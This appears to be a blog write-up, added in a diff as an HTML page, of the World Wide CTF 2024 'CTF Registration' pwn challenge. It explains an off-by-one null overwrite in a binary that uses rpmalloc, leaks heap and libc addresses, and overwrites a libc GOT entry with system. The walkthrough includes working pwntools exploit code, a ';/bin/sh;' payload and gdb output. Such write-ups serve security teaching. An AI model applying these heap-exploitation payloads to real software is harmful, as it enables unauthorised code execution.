@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>World Wide CTF 2024 - CTF Registration | kileak</title>
+
+
+
+
+
+<meta name="description" content="World Wide CTF 2024 - CTF Registration">
+
+
+<meta name="keywords" content="wwctf, ctfreg">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2024/wwctf2024-ctfreg/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">World Wide CTF 2024 - CTF Registration</h1>
+      <p class="post-meta">Nov 24, 2024</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>World Wide CTF 2024 - CTF Registration
+<!--break-->
+500 / hard</p>
+
+  <p>Author: nosiume</p>
+
+  <p>I’m finally making my own ctf competition!
+I wanted to make sure that my registration system is safe and since I know from past ctf experience that glibc malloc is very easy to exploit; I decided to use a different allocator :)</p>
+
+  <p>nc ctf-registration.chal.wwctf.com 1337</p>
+
+  <p>Team: Weak But Leet</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/wwctf24/ctfreg/ctf_registration.zip">ctf_registration.zip</a> 
+<a href="https://kileak.github.io/assets/wwctf24/ctfreg/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> _____ ___________  ______           _     _             _   _             
+/  __ \_   _|  ___| | ___ \         (_)   | |           | | (_)            
+| /  \/ | | | |_    | |_/ /___  __ _ _ ___| |_ _ __ __ _| |_ _  ___  _ __  
+| |     | | |  _|   |    // _ \/ _` | / __| __| '__/ _` | __| |/ _ \| '_ \ 
+| \__/\ | | | |     | |\ \  __/ (_| | \__ \ |_| | | (_| | |_| | (_) | | | |
+ \____/ \_/ \_|     \_| \_\___|\__, |_|___/\__|_|  \__,_|\__|_|\___/|_| |_|
+                                __/ |                                      
+                               |___/  
+
+1) Register hacker
+2) Read hacker profile
+3) Quit
+
+&gt;&gt; </code></pre></figure>
+
+<p>The challenge is using a custom heap allocator <a href="https://github.com/mjansson/rpmalloc">rpmalloc</a>.</p>
+
+<p>The only two functionalities in this are creating a new hacker object and showing it (and the hidden credits-function, which isn’t needed, though).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Hacker</span> <span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">age</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">register_hacker</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
+	<span class="n">Hacker</span> <span class="o">*</span><span class="n">hacker</span><span class="p">;</span>	
+
+	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">hackers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">);</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="mi">99</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Sorry ! No spots left :/"</span><span class="p">);</span>
+
+	<span class="n">hacker</span> <span class="o">=</span> <span class="p">(</span><span class="n">Hacker</span> <span class="o">*</span><span class="p">)</span><span class="n">rpmalloc</span><span class="p">(</span><span class="mh">0x30LL</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"How old is the hacker? "</span><span class="p">);</span>
+	<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="n">hacker</span><span class="p">);</span>
+	<span class="n">getchar</span><span class="p">();</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"What's the hacker's name ? "</span><span class="p">);</span>
+	<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%16[^</span><span class="se">\n</span><span class="s">]s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hacker</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+	<span class="n">getchar</span><span class="p">();</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"How would you describe this hacker ? "</span><span class="p">);</span>
+	<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%32[^</span><span class="se">\n</span><span class="s">]s"</span><span class="p">,</span> <span class="n">hacker</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span> <span class="c1">// off-by-one</span>
+	<span class="n">getchar</span><span class="p">();</span>
+
+	<span class="n">hackers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">hacker</span><span class="p">;</span>
+
+	<span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">"Your hacker number is %zu !</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Reading the description, with <code class="language-plaintext highlighter-rouge">__isoc99_scanf("%32[^\n]s", hacker-&gt;description);</code> can result in a one-byte null overwrite. If we give exactly 32 chars, the LSB of the following address will be overwritten with a null byte. So, let’s take a look at the memory layout of the heap chunks, which gets allocated by <code class="language-plaintext highlighter-rouge">rpmalloc</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00007fffe0000000
+0x7fffe0000000:	0x0000003000000003	0x0000005300000552
+0x7fffe0000010:	0x0000000000000053	0x0000000000000004
+0x7fffe0000020:	0x0000000000000000	0x00007ffff7ffa000
+0x7fffe0000030:	0x0000000000000000	0x0000000000000000
+0x7fffe0000040:	0x0000000000000000	0x00007ffff7ffa000
+0x7fffe0000050:	0xffffffffffff0000	0x0000100000000001
+0x7fffe0000060:	0x0000000000010000	0x0000000008271000
+0x7fffe0000070:	0x0000000020000000	0x0000000000000000
+0x7fffe0000080:	0x0000000000000000	0x4141414141414141 &lt;= Age / Name
+0x7fffe0000090:	0x4141414141414141	0x4141414141414141 &lt;= Description
+0x7fffe00000a0:	0x4141414141414141	0x0041414141414141
+0x7fffe00000b0:	0x00007fffe00000e0	0x0000000000000000 &lt;= Next free FD
+0x7fffe00000c0:	0x0000000000000000	0x0000000000000000
+0x7fffe00000d0:	0x0000000000000000	0x0000000000000000
+
+gef➤  x/30gx 0x00007ffff7ffa000
+0x7ffff7ffa000:	0x00007ffff7d8f740	0x0000000000000000
+0x7ffff7ffa010:	0x0000000000000000	0x0000000000000000
+0x7ffff7ffa020:	0x00007fffe00000b0	0x0000000000000000 &lt;= Last next free FD</code></pre></figure>
+
+<p>Every chunk has a pointer to the next free chunk in its first qword. So, when a chunk gets allocated, this address is stored in the <code class="language-plaintext highlighter-rouge">free_list</code> of the current heap and the block itself is returned.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="n">RPMALLOC_ALLOCATOR</span> <span class="kt">void</span><span class="o">*</span>
+<span class="nf">heap_pop_local_free</span><span class="p">(</span><span class="n">heap_t</span><span class="o">*</span> <span class="n">heap</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">size_class</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">block_t</span><span class="o">**</span> <span class="n">free_list</span> <span class="o">=</span> <span class="n">heap</span><span class="o">-&gt;</span><span class="n">local_free</span> <span class="o">+</span> <span class="n">size_class</span><span class="p">;</span>
+	<span class="n">block_t</span><span class="o">*</span> <span class="n">block</span> <span class="o">=</span> <span class="o">*</span><span class="n">free_list</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">EXPECTED</span><span class="p">(</span><span class="n">block</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+		<span class="o">*</span><span class="n">free_list</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+	<span class="k">return</span> <span class="n">block</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, by overwriting the LSB of the next free pointer we can manipulate, which address gets returned afterwards as a new chunk. Though we can at first only overwrite the LSB with a null byte, we can use this to create overlapping chunks, with which we then can fully control the complete next pointer.</p>
+
+<p>But for this, we also need some kind of leak first. Here comes the <code class="language-plaintext highlighter-rouge">age</code> of hacker into play. Since it’s read via <code class="language-plaintext highlighter-rouge">__isoc99_scanf("%lu", hacker);</code>, we can just use a <code class="language-plaintext highlighter-rouge">+</code> as <code class="language-plaintext highlighter-rouge">age</code> which will just keep the value, that’s currently in <code class="language-plaintext highlighter-rouge">age</code>.</p>
+
+<p>Let’s do this to leak the address of the current heap first.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">age</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">age</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+      <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"? "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"+"</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+      <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"? "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"? "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"? "</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"? "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Name: "</span><span class="p">)</span>
+  <span class="n">name</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Age: "</span><span class="p">)</span>
+  <span class="n">age</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">)</span>
+  <span class="n">desc</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">===="</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">name</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">desc</span>
+
+<span class="p">...</span>
+
+<span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>    
+<span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="n">_</span><span class="p">,</span> <span class="n">HEAPLEAK</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0xe0</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP base    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] HEAP leak    : 0x7fffe00000e0
+[*] HEAP base    : 0x7fffe0000000</code></pre></figure>
+
+<p>Since we now know the address of the heap area itself, we can now create an overlapping chunk, for which we control the <code class="language-plaintext highlighter-rouge">next</code> pointer.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span>
+
+<span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>       <span class="c1"># 2
+</span><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"D"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"E"</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span>   <span class="c1"># 3</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7fffe0000000:	0x0000003000000003	0x0000005300000552
+0x7fffe0000010:	0x0000000000000053	0x0000000000000004
+0x7fffe0000020:	0x0000000000000000	0x00007ffff7ffa000
+0x7fffe0000030:	0x0000000000000000	0x0000000000000000
+0x7fffe0000040:	0x0000000000000000	0x00007ffff7ffa000
+0x7fffe0000050:	0xffffffffffff0000	0x0000100000000001
+0x7fffe0000060:	0x0000000000010000	0x0000000008271000
+0x7fffe0000070:	0x0000000020000000	0x0000000000000000
+0x7fffe0000080:	0x0000000000000000	0x4141414141414141 &lt;= hacker 0
+0x7fffe0000090:	0x4141414141414141	0x4141414141414141
+0x7fffe00000a0:	0x0000000000000000	0x0000000000000000
+0x7fffe00000b0:	0x00007fffe00000e0	0x4141414141414141 &lt;= hacker 1
+0x7fffe00000c0:	0x4242424242424242	0x4242424242424242
+0x7fffe00000d0:	0x0000000000000000	0x0000000000000000
+0x7fffe00000e0:	0x00007fffe0000110	0x4141414141414141 &lt;= hacker 2
+0x7fffe00000f0:	0x00007fffe0000028	0x00007fffe0000028
+0x7fffe0000100:	0x00007fffe0000028	0x00007fffe0000028
+0x7fffe0000110:	0x00007fffe0000100	0x4444444444444444 &lt;= hacker 3
+0x7fffe0000120:	0x4545454545454545	0x4545454545454545
+0x7fffe0000130:	0x4545454545454545	0x4545454545454545
+0x7fffe0000140:	0x00007fffe0000100	0x0000000000000000 &lt;= next ptr</code></pre></figure>
+
+<p>Allocating another chunk, would now take the chunk at <code class="language-plaintext highlighter-rouge">0x00007fffe0000100</code>, in which we prepared a fake fd pointing to <code class="language-plaintext highlighter-rouge">0x00007fffe0000028</code>, which would then be put into the freelist. So, the next chunk would be allocated at <code class="language-plaintext highlighter-rouge">0x00007fffe0000028</code> (rpmalloc doesn’t seem to care about aligned chunks :)).</p>
+
+<p>From this chunk we can again leak the address via <code class="language-plaintext highlighter-rouge">age +</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>                 <span class="c1"># 2
+</span><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"D"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"E"</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span>             <span class="c1"># 3
+</span><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"F"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"G"</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span>             <span class="c1"># 4
+</span>
+<span class="c1"># allocate into heap main and leak
+</span><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"X"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span>             <span class="c1"># 5
+</span>
+<span class="n">_</span><span class="p">,</span> <span class="n">HEAPMAIN</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP main    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPMAIN</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] HEAP main    : 0x7ffff7ffa000</code></pre></figure>
+
+<p>With this we’ve leaked an address, which will have a constant offset to <code class="language-plaintext highlighter-rouge">libc</code>, so we can use it to calculate the base address of <code class="language-plaintext highlighter-rouge">libc</code>.</p>
+
+<p>Just have to take care, that the offsets will differ a bit, if <code class="language-plaintext highlighter-rouge">aslr</code> is active or not (and also it turned out that remote the offset was a bit off).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">ASLR</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">HEAPMAIN</span> <span class="o">-</span> <span class="mh">0x262000</span> <span class="o">-</span> <span class="mh">0x2000</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">HEAPMAIN</span> <span class="o">-</span> <span class="mh">0x262000</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">HEAPMAIN</span> <span class="o">-</span> <span class="mh">0x268000</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC base    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>Knowing <code class="language-plaintext highlighter-rouge">libc</code> we can now use this, to create another chunk in <code class="language-plaintext highlighter-rouge">ABS.got</code>, overwriting a got entry, which will get executed, when we <code class="language-plaintext highlighter-rouge">view</code> a hacker.</p>
+
+<p>Since our next chunk will be written into the heap arena, we can directly overwrite the <code class="language-plaintext highlighter-rouge">free_list</code> pointer and control where the next chunk will be allocated.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># allocate into libc abs.got
+</span><span class="n">TARGET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a080</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+
+<span class="n">register</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="sa">b</span><span class="s">"X"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7ffa000:	0x00000000deadbeef	0x5858585858585858
+0x7ffff7ffa010:	0x00007ffff7fac080	0x00007ffff7fac080
+0x7ffff7ffa020:	0x00007ffff7fac080	0x00007ffff7fac080
+0x7ffff7ffa030:	0x0000000000000000	0x0000000000000000
+0x7ffff7ffa040:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Let’s allocate one last chunk, which will overwrite <code class="language-plaintext highlighter-rouge">*ABS*+0xa86a0</code> with <code class="language-plaintext highlighter-rouge">system</code> (which will later be called from <code class="language-plaintext highlighter-rouge">__vfprintf_internal</code>)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">TARGET2</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">TARGET2</span><span class="p">)</span>
+<span class="n">register</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAAA"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Now, all there’s left to do, is to <code class="language-plaintext highlighter-rouge">view</code> a chunk of a hacker with <code class="language-plaintext highlighter-rouge">;/bin/sh;</code> in its description. Just changed the description of hacker <code class="language-plaintext highlighter-rouge">1</code> accordingly.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">register</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s">";/bin/sh;</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>       <span class="c1"># 1
+</span>
+<span class="p">...</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1               
+$rbx   : 0x00005555555593e1  →  0x203a656741000a73 ("s\n"?)
+$rcx   : 0x00005555555593e0  →  0x3a656741000a7325 ("%s\n"?)
+$rdx   : 0x00007fffffffe1f8  →  0x00007fffe00000b8  →  "AAAAAAAA;/bin/sh;"
+$rsp   : 0x00007fffffffbb00  →  0x0000000000000000
+$rbp   : 0x00007fffffffc090  →  0x00000000fbad8004
+$rsi   : 0x00007ffff7e07710  →  &lt;__vfprintf_internal+06e0&gt; endbr64 
+$rdi   : 0x00007fffe00000b8  →  "AAAAAAAA;/bin/sh;"
+$rip   : 0x00007ffff7e08d2c  →  &lt;__vfprintf_internal+1cfc&gt; call 0x7ffff7dba490 &lt;*ABS*+0xa86a0@plt&gt;
+$r8    : 0x00007ffff7f63460  →  0x0000000000000000
+$r9    : 0x7fffffff        
+$r10   : 0x0               
+$r11   : 0x0               
+$r12   : 0x6               
+$r13   : 0x73              
+$r14   : 0xffffffff        
+$r15   : 0x00007fffe00000b8  →  "AAAAAAAA;/bin/sh;"
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7e08d20 &lt;__vfprintf_internal+1cf0&gt; mov    QWORD PTR [rdi+0x8], rax
+   0x7ffff7e08d24 &lt;__vfprintf_internal+1cf4&gt; jmp    0x7ffff7e077df &lt;__vfprintf_internal+1967&gt;
+   0x7ffff7e08d29 &lt;__vfprintf_internal+1cf9&gt; mov    rdi, r15
+●→ 0x7ffff7e08d2c &lt;__vfprintf_internal+1cfc&gt; call   0x7ffff7dba490 &lt;*ABS*+0xa86a0@plt&gt;
+   ↳  0x7ffff7dba490 &lt;*ABS*+0xa86a0@plt+0000&gt; endbr64 
+      0x7ffff7dba494 &lt;*ABS*+0xa86a0@plt+0004&gt; bnd    jmp QWORD PTR [rip+0x1f1bfd]        # 0x7ffff7fac098 &lt;*ABS*@got.plt&gt;
+      0x7ffff7dba49b &lt;*ABS*+0xa86a0@plt+000b&gt; nop    DWORD PTR [rax+rax*1+0x0]
+      0x7ffff7dba4a0 &lt;*ABS*+0xa9b10@plt+0000&gt; endbr64 
+      0x7ffff7dba4a4 &lt;*ABS*+0xa9b10@plt+0004&gt; bnd    jmp QWORD PTR [rip+0x1f1bf5]        # 0x7ffff7fac0a0 &lt;*ABS*@got.plt&gt;
+      0x7ffff7dba4ab &lt;*ABS*+0xa9b10@plt+000b&gt; nop    DWORD PTR [rax+rax*1+0x0]
+──────────── arguments (guessed) ────
+*ABS*+0xa86a0@plt (
+   $rdi = 0x00007fffe00000b8 → "AAAAAAAA;/bin/sh;",
